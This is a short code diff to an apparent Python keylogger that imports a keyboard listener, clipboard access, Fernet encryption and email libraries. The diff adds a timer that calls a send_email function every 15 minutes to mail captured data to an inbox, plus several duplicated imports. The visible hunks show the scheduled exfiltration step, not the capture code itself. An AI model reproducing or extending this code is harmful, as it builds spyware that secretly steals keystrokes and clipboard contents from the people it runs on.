@@ -4,6 +4,16 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+from threading import Timer
+import time
+
+from os import access
+import mailslurp_client
+from requests import options
+from smtplib import SMTP
+from threading import Timer
+import time
+from email.message import EmailMessage
 
 from os import access
 import mailslurp_client
@@ -17,7 +27,6 @@ import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
-import time
 import os
 
 from cryptography.fernet import Fernet
@@ -198,3 +207,9 @@ def send_email():
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
     #print("check your mail :)")
+
+
+#defining time interval for sending the data
+t = Timer(900.0, send_email) #900 seconds,ie 15 mins, can be changed 
+t.start()
+
